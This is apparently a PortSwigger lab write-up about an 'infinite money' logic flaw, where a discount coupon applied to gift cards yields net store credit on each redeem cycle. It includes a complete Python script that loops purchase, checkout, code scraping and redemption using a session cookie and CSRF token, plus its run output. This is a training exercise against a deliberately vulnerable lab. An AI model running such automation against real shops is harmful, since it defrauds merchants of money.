# Infinite money logic flaw

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money), you'll learn: Infinite money logic flaw! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220075600.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220075619.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220075626.png)

In here, **we can redeem some gift cards.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220075751.png)

In the bottom of the home page, we can sign up to their newsletter.

**Let's sign up:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220075844.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220075851.png)

**Now we can use `SIGNUP30` code for our coupon.**

**Let's try to buy the leather jacket:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080117.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080129.png)

**Then go to `/cart` page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080204.png)

As you can see, we've added that product to our cart.

**Also, we can try to use the `SIGNUP30` coupon:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080247.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080309.png)

It successfully applied the coupon.

**Let's remove that product and try to buy a product:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080523.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080543.png)

It works normally.

**Now, since the application has a function that allows users to redeem gift cards, why not try to buy a gift card?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080846.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080920.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220080944.png)

As you can see, we now have a gift card code: `du7uEebi5e`.

**Try to redeem it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220081036.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220081058.png)

**Our store credits added 10 dollars!**

Hmm... How can we abuse this functionality...

Ah! Remember we have the `SIGNUP30` coupon right?

**What if I apply that coupon the the gift card?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220082016.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220082038.png)

**Now the gift card worth `$7.00`. Let's place the order:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220082113.png)

**Then redeem the gift card:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220082247.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220082259.png)

**Oh! Our store credit went from `$89.43` to `$99.43`, and we only used `$7.00` to buy the gift card, which we have added `$3.00` to our store credit!**

**We have infinite money now! Let's write a python script to automate this process:**
```py
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from threading import Thread
import re
import argparse

def sendRequests(url, cookie, csrfToken):
    buyGiftCardData = {
        'productId': '2',
        'redir': 'PRODUCT',
        'quantity': 1
    }

    applyCouponData = {
        'csrf': csrfToken,
        'coupon': 'SIGNUP30'
    }

    placeOrderData = {
        'csrf': csrfToken
    }

    # Buy a gift card
    requests.post(url + '/cart', cookies=cookie, data=buyGiftCardData)

    # Apply SIGNUP30 coupon
    requests.post(url + '/cart/coupon', cookies=cookie, data=applyCouponData)

    # Place order and fetch gift card code
    orderText = requests.post(url + '/cart/checkout', cookies=cookie, data=placeOrderData, allow_redirects=True).text

    # Extract the value of gift card code
    soup = BeautifulSoup(orderText, 'html.parser')
    # Find all <td> tags
    tableTd = soup.find_all('td')
    for td in tableTd:
        # The length of the code is always 10 characters long
        if len(td.text.strip()) == 10:
            # Extract the value of the code
            giftCardCode = td.text.strip()

    redeemGiftCardData = {
        'csrf': csrfToken,
        'gift-card': giftCardCode
    }

    # Redeem gift card
    requests.post(url + '/gift-card', cookies=cookie, data=redeemGiftCardData)

    # Check store credit
    myaccountText = requests.get(url + '/my-account', cookies=cookie).text
    soup = BeautifulSoup(myaccountText, 'html.parser')
    # Find <strong> tag
    strongTag = soup.find('strong')
    # Find pattern 123.00
    storeCredit = float(re.search(r'([0-9]+\.[0-9]{2})', strongTag.text).group(0))

    if storeCredit >= 935.90:
        print('[+] You now can buy the leather jacket WITH the SIGNUP30 coupon.')
        print(f'[+] Store credit: ${str(storeCredit)}')
        exit()
    else:
        # \r to clean previous line
        print(f'[*] Current store credit: ${str(storeCredit)}', end='\r')

def main():
    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit infinite money logic flaw in PortSwigger business logic vulnerabilities lab.')
    parser.add_argument('-u', '--url', metavar='URL', required=True, help='Full URL of the lab. E.g: https://0a9b002b0469da23c5c03cf3003e007b.web-security-academy.net')
    parser.add_argument('-c', '--cookie', metavar='Cookie', required=True, help='Session cookie of your user wiener. E.g: Efi6qVmgThhBsbkiTeugTPMQQ2DtofbC')
    parser.add_argument('-t', '--token', metavar='CSRF_Token', required=True, help='CSRF token. E.g: yVr8Bdqr24wuRU6e6IjZCkdgEhfY3s3c')
    args = parser.parse_args()

    url = args.url
    cookie = {'session': args.cookie}
    csrfToken = args.token

    while True:
        # Create each thread to run function sendRequests(url, cookie, csrfToken)
        thread = Thread(target=sendRequests, args=(url, cookie, csrfToken))
        # Start the thread
        thread.start()
        # Wait for previous thread finish
        thread.join()

if __name__ == '__main__':
    main()
```

**Now, let the script runs, until we have at least `$1337.00` store credit:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10]
└─# python3 exploit.py -u https://0a9b002b0469da23c5c03cf3003e007b.web-security-academy.net -c Efi6qVmgThhBsbkiTeugTPMQQ2DtofbC -t yVr8Bdqr24wuRU6e6IjZCkdgEhfY3s3c
[*] Current store credit: $102.43
[...]
[+] You now can buy the leather jacket WITH the SIGNUP30 coupon.
[+] Store credit: $1129.43
```

**Now the store credit reaches above `$935.90`, let's buy the leather jacket with the coupon!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220102223.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220102240.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-10/images/Pasted%20image%2020221220102252.png)

We did it!

# What we've learned:

1. Infinite money logic flaw